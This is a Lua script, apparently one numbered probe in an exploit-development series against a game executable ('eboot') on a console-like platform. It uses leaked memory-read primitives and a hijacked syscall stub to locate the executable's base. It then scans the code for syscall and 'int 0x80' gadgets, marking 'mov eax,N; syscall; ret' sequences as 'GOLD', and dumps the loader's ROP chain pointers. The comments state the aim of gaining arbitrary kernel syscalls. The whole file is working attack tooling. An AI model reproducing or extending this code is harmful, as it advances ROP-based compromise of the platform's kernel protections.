-- CRASH_CLASS: LOW
-- PROBE 122a: Targeted syscall instruction finder in eboot
--
-- Context: 118a found 1 syscall (0F 05) between 400KB-800KB offset but died
-- before printing the location. This probe scans in smaller chunks with
-- IMMEDIATE output per find. Also dumps surrounding bytes to identify
-- the full gadget pattern (mov eax,N; syscall; ret is the gold target).
--
-- With 117a confirming CClosure +0x20 gadget redirect works (5/5 rounds),
-- finding a "mov eax,N; syscall" gadget means ARBITRARY KERNEL SYSCALLS.

print("=== PROBE 122a: TARGETED SYSCALL FINDER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

collectgarbage("stop")

-- Get eboot base
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local text_size = safe_rd(info + 0x110) or 0

if not text_lo or not text_hi then
    print("ABORT: no eboot base")
    return
end

print(string.format("[*] eboot: 0x%08X_%08X  size=0x%X (%dKB)",
    text_hi, text_lo, text_size, text_size / 1024))

-- Helper to make eboot address
local function eboot_addr(off)
    local new_lo = text_lo + off
    local carry = 0
    if new_lo >= 0x100000000 then
        new_lo = new_lo - 0x100000000
        carry = 1
    end
    return uint64(string.format("0x%X%08X", text_hi + carry, new_lo))
end

-- Helper to read byte at eboot offset
local function read_byte(off)
    local dw = safe_rd(eboot_addr(off - (off % 4)))
    if not dw then return nil end
    local shift = off % 4
    return math.floor(dw / (256 ^ shift)) % 256
end

-- Helper to dump bytes as hex
local function dump_bytes(off, count)
    local parts = {}
    for i = 0, count - 1 do
        local b = read_byte(off + i)
        if b then
            table.insert(parts, string.format("%02X", b))
        else
            table.insert(parts, "??")
        end
    end
    return table.concat(parts, " ")
end

-- ================================================================
-- SECTION A: Scan eboot in chunks, immediate output per syscall
-- ================================================================
print("")
print("--- SECTION A: Full eboot scan for 0F 05 (syscall) ---")
print("")

local total_found = 0
local scan_cap = math.min(text_size, 0x494000)

-- Scan dword by dword, checking all byte positions
for off = 0, scan_cap - 4, 4 do
    local dw = safe_rd(eboot_addr(off))
    if dw then
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256

        -- Check 3 positions within this dword
        local positions = {}
        if b0 == 0x0F and b1 == 0x05 then table.insert(positions, off) end
        if b1 == 0x0F and b2 == 0x05 then table.insert(positions, off + 1) end
        if b2 == 0x0F and b3 == 0x05 then table.insert(positions, off + 2) end

        for _, pos in ipairs(positions) do
            total_found = total_found + 1
            -- IMMEDIATE output with context bytes
            local pre = (pos >= 16) and dump_bytes(pos - 16, 16) or "..."
            local post = dump_bytes(pos, 16)
            print(string.format("  SYSCALL #%d at eboot+0x%X:", total_found, pos))
            print(string.format("    before: %s", pre))
            print(string.format("    at+aft: %s", post))

            -- Decode what's before the syscall
            -- mov eax, imm32 = B8 xx xx xx xx (5 bytes before 0F 05)
            local b_m5 = read_byte(pos - 5)
            local b_m4 = read_byte(pos - 4)
            local b_m3 = read_byte(pos - 3)
            local b_m2 = read_byte(pos - 2)
            local b_m1 = read_byte(pos - 1)
            local b_p2 = read_byte(pos + 2)

            if b_m5 == 0xB8 then
                local sysno = b_m4 + b_m3 * 256 + b_m2 * 65536 + b_m1 * 16777216
                print(string.format("    *** mov eax, %d (0x%X); syscall ***", sysno, sysno))
                if b_p2 == 0xC3 then
                    print(string.format("    *** GOLD: mov eax,%d; syscall; ret at eboot+0x%X ***",
                        sysno, pos - 5))
                end
            end

            -- xor eax,eax (31 C0) before syscall = syscall 0
            if b_m2 == 0x31 and b_m1 == 0xC0 then
                print("    *** xor eax,eax; syscall (sysno=0) ***")
            end

            -- Check if ret follows
            if b_p2 == 0xC3 then
                print("    *** syscall; ret pattern ***")
            end
        end
    end

    -- Also check cross-dword boundary: byte 3 of this dword + byte 0 of next
    if off + 4 < scan_cap then
        local dw2 = safe_rd(eboot_addr(off + 4))
        if dw and dw2 then
            local b3_this = math.floor(dw / 16777216) % 256
            local b0_next = dw2 % 256
            if b3_this == 0x0F and b0_next == 0x05 then
                local pos = off + 3
                total_found = total_found + 1
                local pre = dump_bytes(pos - 16, 16)
                local post = dump_bytes(pos, 16)
                print(string.format("  SYSCALL #%d at eboot+0x%X (cross-dword):", total_found, pos))
                print(string.format("    before: %s", pre))
                print(string.format("    at+aft: %s", post))

                local b_m5 = read_byte(pos - 5)
                local b_m4 = read_byte(pos - 4)
                local b_m3 = read_byte(pos - 3)
                local b_m2 = read_byte(pos - 2)
                local b_m1 = read_byte(pos - 1)
                local b_p2 = read_byte(pos + 2)

                if b_m5 == 0xB8 then
                    local sysno = b_m4 + b_m3 * 256 + b_m2 * 65536 + b_m1 * 16777216
                    print(string.format("    *** mov eax, %d; syscall ***", sysno))
                    if b_p2 == 0xC3 then
                        print(string.format("    *** GOLD: mov eax,%d; syscall; ret at eboot+0x%X ***",
                            sysno, pos - 5))
                    end
                end
                if b_p2 == 0xC3 then
                    print("    *** syscall; ret pattern ***")
                end
            end
        end
    end

    -- Progress every 50K dwords
    if off % 200000 == 0 and off > 0 then
        print(string.format("  ... scanned %dK bytes, %d syscalls found ...",
            off / 1024, total_found))
    end
end

print(string.format("\n[A] TOTAL: %d syscall instructions found in eboot", total_found))


-- ================================================================
-- SECTION B: Scan for int 0x80 (CD 80)
-- ================================================================
print("")
print("--- SECTION B: Scan for CD 80 (int 0x80) ---")
print("")

local int80_count = 0
-- Only scan first 1MB for speed
local b_cap = math.min(text_size, 0x100000)

for off = 0, b_cap - 4, 4 do
    local dw = safe_rd(eboot_addr(off))
    if dw then
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256

        if b0 == 0xCD and b1 == 0x80 then
            int80_count = int80_count + 1
            print(string.format("  int 0x80 at eboot+0x%X", off))
            print(string.format("    bytes: %s", dump_bytes(off - 8, 16)))
        end
        if b1 == 0xCD and b2 == 0x80 then
            int80_count = int80_count + 1
            print(string.format("  int 0x80 at eboot+0x%X", off + 1))
        end
        if b2 == 0xCD and b3 == 0x80 then
            int80_count = int80_count + 1
            print(string.format("  int 0x80 at eboot+0x%X", off + 2))
        end
    end
end
print(string.format("[B] TOTAL: %d int 0x80 instructions in first 1MB", int80_count))


-- ================================================================
-- SECTION C: Dump fn_addr and ropchain from pipe string
-- ================================================================
print("")
print("--- SECTION C: Loader internals ---")
print("")

local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local ret_str = pipe_str:match("fcall_stub%.return_addr: (0x[0-9a-fA-F]+)")

print("[C] fn_addr string: " .. (fn_str or "nil"))
print("[C] ropchain string: " .. (rop_str or "nil"))
print("[C] return_addr string: " .. (ret_str or "nil"))

-- Read fn_addr value
if fn_str then
    local fn_ptr = uint64(fn_str)
    local fn_val = safe_rq(fn_ptr)
    if fn_val then
        local fh, fl = get_hi_lo(fn_val)
        print(string.format("[C] *fn_addr = 0x%08X_%08X", fh, fl))
        -- Check if it's an eboot address
        if fh == text_hi then
            local fn_off = fl - text_lo
            print(string.format("[C] fn_addr points to eboot+0x%X", fn_off))
            print(string.format("[C] bytes at fn target: %s", dump_bytes(fn_off, 32)))
        end
    end
end

print("")
print("=== PROBE 122a COMPLETE ===")
